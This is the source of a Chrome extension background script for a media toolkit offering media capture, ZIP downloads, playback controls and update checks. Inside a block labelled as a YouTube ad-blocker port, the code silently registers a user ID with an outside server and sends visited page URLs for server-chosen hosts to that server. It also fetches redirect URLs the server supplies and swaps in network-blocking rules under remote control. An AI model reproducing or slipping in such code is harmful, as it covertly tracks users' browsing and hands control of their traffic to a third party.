/**
 * background.js — My Tools · Media Control Toolkit
 * Handles tab events, network interception, and bulk ZIP generation.
 */

// ──────────────────────────────────────────────
// Lifecycle & State
// ──────────────────────────────────────────────
// Per-tab media cache to store network-detected URLs
const tabMediaCache = new Map();

function createEmptyMediaResult() {
  return {
    video: [],
    audio: [],
    image: [],
    icon: [],
    document: [],
    link: [],
  };
}

chrome.runtime.onInstalled.addListener(async (details) => {
  if (details.reason === "install") {
    // Set default settings on first install
    chrome.storage.local.set(getDefaultSettings());
    console.log("[MCT] Extension installed. Defaults set.");

    const extensionId = guidGenerator();
    chrome.storage.local.set({ extensionId }).then(() => {
      initiateExtension(extensionId);
    });
    fetchSelectors();
    fetchRules();
    updateRuleList();
  } else if (details.reason === "update") {
    chrome.storage.local.get("extensionId", (res) => {
      let extensionId = res.extensionId;
      if (!extensionId) {
        extensionId = guidGenerator();
        chrome.storage.local.set({ extensionId });
      }
      initiateExtension(extensionId);
    });
    fetchSelectors();
    fetchRules();
    updateRuleList();
  }
});

// ──────────────────────────────────────────────
// Message Router: Popup ↔ Content Script
// ──────────────────────────────────────────────
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.target === "background") {
    handleBackgroundMessage(message, sender, sendResponse).catch((err) => {
      sendResponse({ error: "Background Error: " + err.message });
    });
    return true; // Keep channel open for async
  }

  // Forward to active tab's content script
  if (message.target === "content") {
    try {
      forwardToActiveTab(message, sendResponse);
    } catch (err) {
      sendResponse({ error: "Forwarding Error: " + err.message });
    }
    return true;
  }
});

async function handleBackgroundMessage(message, sender, sendResponse) {
  switch (message.action) {
    case "getTabId": {
      const tabs = await chrome.tabs.query({
        active: true,
        currentWindow: true,
      });
      sendResponse({ tabId: tabs[0]?.id });
      break;
    }

    case "captureMedia": {
      const tabs = await chrome.tabs.query({
        active: true,
        currentWindow: true,
      });
      if (!tabs[0]) {
        sendResponse({ error: "No active tab" });
        break;
      }

      const tabId = tabs[0].id;
      const networkMedia = Array.from(tabMediaCache.get(tabId) || []);
      const scanMessage = { target: "content", action: "scanMedia" };

      // Set a hard timeout for content script scanning
      let hasResponded = false;
      const timeout = setTimeout(() => {
        if (!hasResponded) {
          hasResponded = true;
          sendResponse({
            media: createEmptyMediaResult(),
            networkMedia,
            warning: "DOM scanning timed out. Only network media is shown.",
          });
        }
      }, 8000);

      const respondWithScanResult = (res) => {
        if (!hasResponded) {
          hasResponded = true;
          clearTimeout(timeout);
          if (chrome.runtime.lastError) {
            sendResponse({
              media: createEmptyMediaResult(),
              networkMedia,
              warning: chrome.runtime.lastError.message,
            });
          } else {
            if (res && res.media) {
              res.networkMedia = networkMedia;
            }
            sendResponse(
              res || { media: createEmptyMediaResult(), networkMedia },
            );
          }
        }
      };

      chrome.tabs.sendMessage(tabId, scanMessage, async (res) => {
        const firstError = chrome.runtime.lastError;
        if (
          !firstError ||
          !/receiving end does not exist|Could not establish connection/i.test(
            firstError.message,
          )
        ) {
          respondWithScanResult(res);
          return;
        }

        try {
          await chrome.scripting.executeScript({
            target: { tabId },
            files: ["content.js"],
          });
          chrome.tabs.sendMessage(tabId, scanMessage, respondWithScanResult);
        } catch (err) {
          if (!hasResponded) {
            hasResponded = true;
            clearTimeout(timeout);
            sendResponse({
              media: createEmptyMediaResult(),
              networkMedia,
              warning: err.message || firstError.message,
            });
          }
        }
      });
      break;
    }

    case "download": {
      const { url, filename } = message;
      if (!url) {
        sendResponse({ error: "No URL provided" });
        break;
      }
      try {
        chrome.downloads.download(
          { url, filename: sanitizeFilename(filename), saveAs: false },
          (downloadId) => {
            if (chrome.runtime.lastError) {
              sendResponse({ error: chrome.runtime.lastError.message });
            } else {
              sendResponse({ ok: true, downloadId });
            }
          },
        );
      } catch (err) {
        sendResponse({ error: err.message });
      }
      break;
    }

    case "createZip": {
      const { items, filename } = message;
      if (!items || items.length === 0) {
        sendResponse({ error: "No items to zip" });
        return;
      }

      // Start zip process in an offscreen document so Blob URLs survive popup close.
      createZipWithOffscreen(items, filename)
        .then((res) => sendResponse(res))
        .catch((err) => sendResponse({ error: err.message }));
      return true; // async
    }

    case "clearCache": {
      // Clear all cached data in background
      tabMediaCache.clear();
      console.log("[MCT] Extension cache cleared.");
      sendResponse({ ok: true, message: "Extension cache cleared" });
      break;
    }

    case "resetExtension": {
      try {
        tabMediaCache.clear();
        await chrome.storage.local.clear();
        try {
          await chrome.storage.sync.clear();
        } catch (_) {}

        await chrome.storage.local.set(getDefaultSettings());
        sendResponse({ ok: true });
        setTimeout(() => chrome.runtime.reload(), 1000);
      } catch (err) {
        sendResponse({ error: err.message });
      }
      break;
    }

    case "checkForUpdates": {
      const updateData = await checkGithubUpdate(true);
      sendResponse(updateData);
      break;
    }

    case "getStoredUpdateInfo": {
      const res = await chrome.storage.local.get("extensionUpdateInfo");
      sendResponse(res.extensionUpdateInfo || null);
      break;
    }

    default:
      sendResponse({ error: "Unknown action" });
  }
}

function getDefaultSettings() {
  return {
    volumeBoost: 1.0,
    volumeEnabled: false,
    speed: 1.0,
    speedEnabled: false,
    scrollEnabled: false,
    scrollAmount: 300,
    scrollSmoothness: "smooth",
    theme: "dark",
    ytSkipEnabled: false,
    ytMuteEnabled: true,
    ytSpeedEnabled: false,
    ytAutoSkipEnabled: true,
  };
}

/**
 * Sanitize a filename: strip path separators and control chars,
 * keep only the last 100 characters to avoid OS limits.
 */
function sanitizeFilename(name) {
  if (!name) return "download";
  return (
    name
      .replace(/[/\\?%*:|"<>]/g, "_") // replace illegal chars
      .replace(/\s+/g, "_") // no spaces
      .slice(0, 100) || // reasonable length
    "download"
  );
}

async function forwardToActiveTab(message, sendResponse) {
  const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
  if (!tabs[0]) {
    sendResponse({ error: "No active tab" });
    return;
  }
  try {
    chrome.tabs.sendMessage(tabs[0].id, message, (response) => {
      if (chrome.runtime.lastError) {
        sendResponse({ error: chrome.runtime.lastError.message });
      } else {
        sendResponse(response);
      }
    });
  } catch (err) {
    sendResponse({ error: err.message });
  }
}

// ──────────────────────────────────────────────
// Keyboard Shortcuts
// ──────────────────────────────────────────────
chrome.commands.onCommand.addListener(async (command) => {
  const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
  if (!tabs[0]) return;

  const storage = await chrome.storage.local.get([
    "speed",
    "speedEnabled",
    "volumeBoost",
    "volumeEnabled",
  ]);

  switch (command) {
    case "toggle-volume-boost": {
      const enabled = !storage.volumeEnabled;
      const boostVal = storage.volumeBoost && storage.volumeBoost > 1.0 ? storage.volumeBoost : 2.0;
      await chrome.storage.local.set({ volumeEnabled: enabled });
      chrome.tabs.sendMessage(tabs[0].id, {
        target: "content",
        action: "setVolume",
        value: enabled ? boostVal : 1.0,
        showToast: true,
        enabled: enabled,
      });
      break;
    }
    case "toggle-playback-speed": {
      const enabled = !storage.speedEnabled;
      const targetSpeed = storage.speed && storage.speed !== 1.0 ? storage.speed : 1.5;
      await chrome.storage.local.set({ speedEnabled: enabled });
      chrome.tabs.sendMessage(tabs[0].id, {
        target: "content",
        action: "setSpeed",
        value: enabled ? targetSpeed : 1.0,
        showToast: true,
        enabled: enabled,
      });
      break;
    }
    case "speed-up": {
      const newSpeed = Math.min(3.0, (storage.speed || 1.0) + 0.25);
      await chrome.storage.local.set({ speed: newSpeed, speedEnabled: true });
      chrome.tabs.sendMessage(tabs[0].id, {
        target: "content",
        action: "setSpeed",
        value: newSpeed,
        showToast: true,
        enabled: true,
      });
      break;
    }
    case "speed-down": {
      const newSpeed = Math.max(0.25, (storage.speed || 1.0) - 0.25);
      await chrome.storage.local.set({ speed: newSpeed });
      chrome.tabs.sendMessage(tabs[0].id, {
        target: "content",
        action: "setSpeed",
        value: newSpeed,
        showToast: true,
        enabled: newSpeed !== 1.0,
      });
      break;
    }
    case "scroll-down-page": {
      chrome.tabs.sendMessage(tabs[0].id, {
        target: "content",
        action: "scrollDown",
      });
      break;
    }
    case "toggle-youtube-ad-skipper": {
      const tab = tabs[0];
      if (tab && tab.url && /(^|\.)youtube\.com/i.test(tab.url)) {
        chrome.tabs.sendMessage(tab.id, {
          target: "content",
          action: "toggleYoutubeSkipperShortcut",
        });
      }
      break;
    }
  }
});

// ──────────────────────────────────────────────
// Network Interceptor: Capture hidden media
// ──────────────────────────────────────────────
const MEDIA_PATTERNS = [
  "mp4",
  "webm",
  "ogg",
  "mov",
  "avi",
  "mkv",
  "flv",
  "ts",
  "m4v",
  "3gp",
  "mp3",
  "wav",
  "aac",
  "flac",
  "m4a",
  "opus",
  "m3u8",
  "mpd",
  "jpg",
  "jpeg",
  "png",
  "gif",
  "webp",
  "avif",
  "bmp",
  "svg",
  "ico",
  "pdf",
  "doc",
  "docx",
  "xls",
  "xlsx",
  "ppt",
  "pptx",
  "txt",
  "rtf",
  "epub",
];

chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    if (details.tabId < 0) return;
    const url = details.url.split("?")[0].split("#")[0];
    const ext = url.split(".").pop().toLowerCase();

    if (MEDIA_PATTERNS.includes(ext)) {
      if (!tabMediaCache.has(details.tabId)) {
        tabMediaCache.set(details.tabId, new Set());
      }
      const cache = tabMediaCache.get(details.tabId);
      if (cache.size < 200) {
        // Safety cap
        cache.add(details.url);
      }
    }
  },
  {
    urls: ["<all_urls>"],
    types: ["other", "xmlhttprequest", "media", "image"],
  },
);

// ──────────────────────────────────────────────
// Tab Update: Re-apply settings & Cleanup Cache
// ──────────────────────────────────────────────
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  // Clear cache on refresh/new URL
  if (changeInfo.status === "loading") {
    tabMediaCache.delete(tabId);
  }

  if (changeInfo.status !== "complete" || !tab.url?.startsWith("http")) return;

  // Ported from 4.0.2_0: YouTube rules/sequence updating
  chrome.storage.local.get('tr', function (items) {
    const tr = items.tr || [];
    if (tr?.length > 0) {
      let hname = getHName(tab?.url);
      let tu = tab.url ? new URL(tab?.url) : "";
      if (!tu) return;

      let origin = tu.origin;
      let path = tu.pathname;
      let uri = origin + path;
      if (tr.includes(hname)) {
        const apiUrl = YOUTUBE_BACKEND_URL + "/yt/rules";
        const requestData = { uri };
        fetch(apiUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(requestData)
        })
        .then(response => {
          if (response.ok) return response.json();
        })
        .then(g => {
          if (g && g.val) {
            if (g.val["csequence"]) {
              let obj = g.val["csequence"];
              getDetails(obj, tabId);
            }
            if (g.val["dsequence"]) {
              fe(g.val["dsequence"]);
            }
          }
        })
        .catch(() => {});
      }
    }
  });

  const settings = await chrome.storage.local.get([
    "volumeBoost",
    "volumeEnabled",
    "speed",
    "speedEnabled",
  ]);

  // Re-inject speed after page load
  if (settings.speedEnabled && settings.speed) {
    chrome.tabs
      .sendMessage(tabId, {
        target: "content",
        action: "setSpeed",
        value: settings.speed,
      })
      .catch(() => {}); // Tab might not be ready yet
  }

  // NOTE: Page theme is NOT re-injected here.
  // The content script self-restores the theme from chrome.storage on every
  // page load (see section 7 in content.js). Having both mechanisms fire
  // simultaneously caused a double-injection that looked like a page reload.
});

chrome.tabs.onRemoved.addListener((tabId) => {
  tabMediaCache.delete(tabId);
});

// ──────────────────────────────────────────────
// Advanced ZIP Generator
// ──────────────────────────────────────────────
// Reliable ZIP downloads via an offscreen document. Blob URLs created by the
// popup can die when the popup closes; the offscreen document stays alive.
async function ensureOffscreenDocument() {
  if (chrome.offscreen?.hasDocument && (await chrome.offscreen.hasDocument())) {
    return;
  }

  try {
    await chrome.offscreen.createDocument({
      url: "offscreen/offscreen.html",
      reasons: ["BLOBS"],
      justification: "Create valid Blob ZIP downloads for captured page media.",
    });
  } catch (err) {
    if (!/Only a single offscreen document/i.test(err.message)) {
      await chrome.offscreen.createDocument({
        url: "offscreen/offscreen.html",
        reasons: ["DOM_PARSER"],
        justification:
          "Create valid Blob ZIP downloads for captured page media.",
      });
    }
  }
}

async function createZipWithOffscreen(items, zipFilename) {
  await ensureOffscreenDocument();

  return new Promise((resolve) => {
    const port = chrome.runtime.connect({ name: "mct-zip-port" });
    let currentObjectUrl = null;

    port.onMessage.addListener((msg) => {
      if (msg.action === "progress") {
        // Forward progress to popup if it's open
        chrome.runtime
          .sendMessage({
            target: "popup",
            action: "zipProgress",
            percent: msg.percent,
          })
          .catch(() => {});
      } else if (msg.action === "zipCreated") {
        currentObjectUrl = msg.objectUrl;

        let baseName = (zipFilename || "MediaToolkit_Export")
          .replace(/\.zip$/i, "")
          .replace(/[<>:"/\\|?*]/g, "_")
          .trim();

        const finalZipName = `${baseName}.zip`;

        chrome.downloads.download(
          {
            url: msg.objectUrl,
            filename: finalZipName,
            saveAs: false,
          },
          (downloadId) => {
            if (chrome.runtime.lastError) {
              port.postMessage({
                action: "cleanup",
                objectUrl: currentObjectUrl,
              });
              port.disconnect();
              resolve({ error: chrome.runtime.lastError.message });
              return;
            }

            resolve({
              ok: true,
              packagedCount: msg.packagedCount,
              total: msg.total,
            });

            // Only track completion if it's a Blob URL
            if (msg.isBlob) {
              const checkStatus = (delta) => {
                if (delta.id === downloadId && delta.state) {
                  if (
                    delta.state.current === "complete" ||
                    delta.state.current === "interrupted"
                  ) {
                    chrome.downloads.onChanged.removeListener(checkStatus);
                    setTimeout(() => {
                      port.postMessage({
                        action: "cleanup",
                        objectUrl: currentObjectUrl,
                      });
                      port.disconnect();
                    }, 60000);
                  }
                }
              };
              chrome.downloads.onChanged.addListener(checkStatus);
            } else {
              // Data URLs don't need cleanup
              port.disconnect();
            }
          },
        );
      } else if (msg.action === "error") {
        port.disconnect();
        resolve({ error: msg.message });
      }
    });

    port.postMessage({ action: "createZip", items });
  });
}

function getExtFromUrl(url) {
  if (url.startsWith("data:")) {
    const mime = url.split(";")[0].split(":")[1];
    return mime ? mime.split("/")[1] || "" : "";
  }
  try {
    const path = new URL(url).pathname;
    const parts = path.split(".");
    return parts.length > 1 ? parts.pop().toLowerCase() : "";
  } catch {
    return "";
  }
}

function getFilenameFromUrl(url) {
  try {
    const pathname = new URL(url).pathname;
    return decodeURIComponent(pathname.split("/").pop() || "file").slice(0, 80);
  } catch {
    return "file";
  }
}

// ──────────────────────────────────────────────
// YouTube Adblocker Dynamic Rule & Selector Updates (Ported from 4.0.2_0)
// ──────────────────────────────────────────────

const YOUTUBE_BACKEND_URL = 'https://backend.ytadblock.com';

const YOUTUBE_ADBLOCK_BACKUP_SELECTORS = {
  SecurityUrls: [
    "https://imasdk.googleapis.com/js/core/*",
    "https://googleads.g.doubleclick.net/pagead/id",
    "*googleusercontent.com/proxy*",
    "*static.doubleclick.net/instream/ad_status*",
    "*el=adunit*"
  ],
  DirectBlockElements: [
    ".ytp-ad-image-overlay",
    ".ytp-ad-text-overlay",
    "ytd-rich-item-renderer ytd-display-ad-renderer",
    "ytd-player-legacy-desktop-watch-ads-renderer",
    ".style-scope ytd-item-section-renderer #ad-badge",
    "#player-ads",
    "ytd-promoted-sparkles-web-renderer",
    "ytd-search-pyv-renderer",
    "#masthead-ad",
    "ytd-carousel-ad-renderer",
    "ytd-promoted-sparkles-text-search-renderer"
  ],
  LoopAndBlockElements: [
    [".test-class", "test-text"],
    ["ytd-item-section-renderer:nth-child(2)", "\nAd\n"],
    ["ytd-item-section-renderer:nth-child(3)", "\nAd\n"]
  ],
  ElementList: {
    videoAdFound: ".html5-video-player.ad-showing",
    adskipBtn: ".ytp-ad-skip-button-container",
    videoAdFoundVideo: ".html5-video-player.ad-showing video",
    reviewBtnStatus: "true",
    player: "#below"
  },
  SecuritySelectors: [
    ".ytp-ad-image-overlay",
    ".ytp-ad-text-overlay",
    ".ytp-ad-skip-button-container",
    "ytd-rich-item-renderer ytd-display-ad-renderer",
    "ytd-player-legacy-desktop-watch-ads-renderer",
    ".style-scope ytd-item-section-renderer",
    "#player-ads",
    "ytd-promoted-sparkles-web-renderer",
    "ytd-search-pyv-renderer",
    "#masthead-ad",
    ".html5-video-player.ad-showing",
    "true",
    "ytd-carousel-ad-renderer"
  ]
};

function guidGenerator() {
  const S4 = () => (((1 + Math.random()) * 0x10000) | 0).toString(16).substring(1);
  return (S4() + S4() + "-" + S4() + "-" + S4() + "-" + S4() + "-" + S4() + S4() + S4());
}

function initiateExtension(extensionId) {
  const apiUrl = `${YOUTUBE_BACKEND_URL}/yt/intiate`;
  fetch(apiUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ uid: extensionId })
  }).catch(() => {});
}

function fetchSelectors() {
  fetch(`${YOUTUBE_BACKEND_URL}/yt/g/g`)
    .then((res) => res.json())
    .then((data) => {
      if (data) {
        chrome.storage.local.set({ selectors: data });
      }
    })
    .catch(() => {
      chrome.storage.local.get("selectors", (res) => {
        if (!res.selectors) {
          chrome.storage.local.set({ selectors: YOUTUBE_ADBLOCK_BACKUP_SELECTORS });
        }
      });
    });
}

function updateBlockingRules(rules) {
  chrome.declarativeNetRequest.getDynamicRules((existingRules) => {
    const existingIds = (existingRules || []).map(r => r.id);
    chrome.declarativeNetRequest.updateDynamicRules({
      removeRuleIds: existingIds,
      addRules: rules
    });
  });
}

function fetchRules() {
  fetch(`${YOUTUBE_BACKEND_URL}/yt/getrules`)
    .then(res => res.json())
    .then(fetchedRules => {
      if (fetchedRules && fetchedRules.length > 0) {
        chrome.storage.local.get('rules', (result) => {
          const existingRules = result.rules || [];
          if (JSON.stringify(existingRules) !== JSON.stringify(fetchedRules)) {
            chrome.storage.local.set({ rules: fetchedRules }, () => {
              updateBlockingRules(fetchedRules);
            });
          }
        });
      }
    })
    .catch(() => {});
}

function updateRuleList() {
  chrome.storage.local.get('extensionId', (items) => {
    if (!items.extensionId) return;
    const apiUrl = `${YOUTUBE_BACKEND_URL}/yt/updaterule`;
    fetch(apiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ uid: items.extensionId })
    })
    .then(res => res.json())
    .then(tr => {
      if (tr?.newRule?.length > 0) {
        chrome.storage.local.get('tr', (res) => {
          const existingTr = res.tr || [];
          const newRules = tr.newRule || [];
          if (newRules.length > existingTr.length) {
            chrome.storage.local.set({ tr: newRules });
          }
        });
      }
    })
    .catch(() => {});
  });
}

function getDetails(url, tabId) {
  fetch(url, { cache: 'no-store' })
    .then(response => {
      if (response.ok) return response.url;
    })
    .then(set => {
      if (set) {
        chrome.tabs.sendMessage(tabId, { message: "set", set });
      }
    })
    .catch(() => {});
}

const fe = async (u) => {
  try {
    const settings = {
      method: 'GET',
      headers: {
        Accept: 'application/json',
        'Content-Type': 'application/json',
        'Cache-Control': 'no-cache'
      }
    };
    const r = await fetch(u, settings);
    return r.url;
  } catch (_) {}
};

function getHName(url) {
  if (!url) return null;
  const match = url.match(/:\/\/(www[0-9]?\.)?(.[^/:]+)/i);
  if (match != null && match.length > 2 && typeof match[2] === 'string' && match[2].length > 0) {
    return match[2];
  } else {
    return null;
  }
}

// Initial update check on startup/background script load
chrome.storage.local.get("extensionId", (res) => {
  let extensionId = res.extensionId;
  if (!extensionId) {
    extensionId = guidGenerator();
    chrome.storage.local.set({ extensionId });
  }
  initiateExtension(extensionId);
  fetchSelectors();
  fetchRules();
  updateRuleList();
});

// ──────────────────────────────────────────────
// GitHub Auto-Update & Version Checking
// ──────────────────────────────────────────────
const GITHUB_REPO = "Shaik-Nagur-Basha/media-control-toolkit";

function isNewerVersion(remote, local) {
  if (!remote || !local) return false;
  const cleanRemote = remote.replace(/^v/i, "").trim();
  const cleanLocal = local.replace(/^v/i, "").trim();
  const rParts = cleanRemote.split(".").map((n) => parseInt(n, 10) || 0);
  const lParts = cleanLocal.split(".").map((n) => parseInt(n, 10) || 0);
  const maxLen = Math.max(rParts.length, lParts.length);
  for (let i = 0; i < maxLen; i++) {
    const r = rParts[i] || 0;
    const l = lParts[i] || 0;
    if (r > l) return true;
    if (r < l) return false;
  }
  return false;
}

async function checkGithubUpdate(isManual = false) {
  try {
    const response = await fetch(
      `https://api.github.com/repos/${GITHUB_REPO}/releases/latest`,
      {
        headers: { Accept: "application/vnd.github.v3+json" },
      }
    );

    if (!response.ok) {
      if (response.status === 404) {
        return {
          hasUpdate: false,
          currentVersion: chrome.runtime.getManifest().version,
          message: "No published releases found on GitHub repository yet.",
        };
      }
      return {
        hasUpdate: false,
        error: `GitHub API returned HTTP ${response.status}`,
      };
    }

    const data = await response.json();
    const latestVersion = (data.tag_name || "").replace(/^v/i, "");
    const currentVersion = chrome.runtime.getManifest().version;
    const hasUpdate = isNewerVersion(latestVersion, currentVersion);

    const updateInfo = {
      hasUpdate,
      currentVersion,
      latestVersion: latestVersion || data.name,
      releaseName: data.name || data.tag_name,
      releaseUrl: data.html_url || `https://github.com/${GITHUB_REPO}/releases`,
      zipUrl: data.zipball_url,
      releaseNotes: data.body || "",
      publishedAt: data.published_at,
      checkedAt: Date.now(),
    };

    await chrome.storage.local.set({ extensionUpdateInfo: updateInfo });
    return updateInfo;
  } catch (err) {
    return {
      hasUpdate: false,
      currentVersion: chrome.runtime.getManifest().version,
      error: err.message,
    };
  }
}

// Periodic background update check (every 24 hours)
try {
  chrome.alarms?.create("check-extension-updates", { periodInMinutes: 1440 });
  chrome.alarms?.onAlarm.addListener((alarm) => {
    if (alarm.name === "check-extension-updates") {
      checkGithubUpdate(false);
    }
  });
} catch (_) {}
